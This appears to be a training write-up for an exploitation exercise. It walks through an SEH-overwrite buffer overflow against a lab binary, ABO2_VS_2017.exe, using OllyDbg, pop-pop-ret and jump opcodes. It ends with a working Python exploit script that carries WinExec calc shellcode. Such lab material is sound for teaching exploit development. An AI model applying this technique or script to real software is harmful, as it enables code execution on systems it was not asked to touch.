**ABO2_VS_2017.exe**

The goal is executing the calculator.

![](media/490263e68907b823d08d94e3ad183c48.png)

There is a **gets** in the function **main**, but at the end, instead of a **ret** instruction we find an **exit()**. This means that the program ends here before returning from the function.

![](media/d302f3877226d19a197c371fe4cb32bb.png)

In this case, we do not have any return address to overwrite, so what we can do is overwrite the structured exception handler **(SEH)**.

Let’s see it in **ollydbg:**

We place a **bp** after **gets** and before **exit()**.

![](media/7626bae6af7da1897acda28331fbd470.png)

In the stack we will see the string we have sent, and in this way, we can calculate the amount of bytes necessary to reach the **SEH** and overwrite it.

![](media/172131b36d7e7662abb59d7d9c7cb9d9.png)

In this case it’s **0x4D4 + 4 + 1**.

![](media/0d2d0fa207a95529fad5223a0814796e.png)

**40B170** handles the crash, in the stack we see it at offset **0x43C**

![](media/bf9a89a7fdb96101ed3cd0ab93a0a4f1.png)

When we fill the buffer, that value will be overwritten.

Let’s make the program crash.

![](media/8119d30f094de49c885464c905864f0e.png)

After crashing, we see that the **EDI** register points to the beginning of our **payload**.

**![](media/c10c79cf05491ad65c3f45432d6bb088.png)**

So we will replace the address of **seh** to one that points to a **JPM EDI** or similar.

![](media/8272f5a7693546b9c8883cd4972b9557.png)![](media/db64e5065bc30679aec586410a6d3d03.png)

I made it crash but it installed the same **SEH** again.

**![](media/5c98874ebae813ef4505a312d5a856d1.png)**

Instead of a **call edi**, we will have to search for a **pop** **pop ret**, because upon returning from **SEH**, we always have a pointer to our buffer in **ESP+8**

![](media/addec051417e1bb557d710b901cbd0c7.png)

By following **esp+8**  we can see our **Payload**

![](media/4036e956effffb1f715b5f742b4f5610.png)

Here we find in **POP POP RET**

**![](media/b6cab2042f40ae00a077d959f9265e87.png)**

Upon executing **RET** we will jump to the **payload** above **0x41414141**,

**![](media/1c5b419f561d448923fb54c02eb6aa18.png)**

In **SEH** we have the pointer to **POP POP RET**, so we need to avoid executing it. To do so, we need to jump over using the bytes **EB 06** (a jump 4 bytes forward).

![](media/aaaf34d5059ab039d13ce0a7e3969c8d.png)

At this point, we have another problem, which is that the shellcode doesn’t fit below the SEH, so the solution is to write it at the beginning and once SEH is overwritten, jump backwards.

These are the opcodes for the jump

![](media/e7d50992eaf368f53e4d4c73937dc4f1.png)

As the exception handler is executed over and over, the program never finishes and endlessly executes the shellcode, so to force it to finish, we added a call to **\_exit()**.

The script would look like this:

| import sys import binascii from subprocess import Popen, PIPE   winexec_calc_shellcode = b'31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7' winexec_calc_shellcode = binascii.unhexlify(winexec_calc_shellcode)  size_crash = 0xE6 size_to_next_seh = 0x438 next_seh = b"\\xEB\\x06\\x90\\x90" \# Un JMP para evitar pisar el seh  current_seh = b"\\x31\\x12\\x40\\x00" \# Salta al pop pop ret jmp_to_payload = b"\\xE9\\xBB\\xFB\\xFF\\xFF\\x90" \# Salta al payload jmp_to_exit = b"\\xE9\\xB1\\x14\\x26\\x00\\x90" \# JMP 40102C  buffer = winexec_calc_shellcode  buffer += jmp_to_exit + b"\\x90" \* (size_to_next_seh - len(winexec_calc_shellcode) - len(jmp_to_exit)) buffer += next_seh buffer += current_seh buffer += jmp_to_payload buffer += b"\\x90" \* size_crash \# Size para de desbordar la pila  payload = buffer  p1 = Popen("ABO2_VS_2017.exe", stdin=PIPE) print ("PID: %s" % hex(p1.pid)) print ("Enter para continuar")  p1.communicate(payload) p1.wait() input() |
|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|

**![](media/3af6e22514d12cee5855229273adc041.png)**
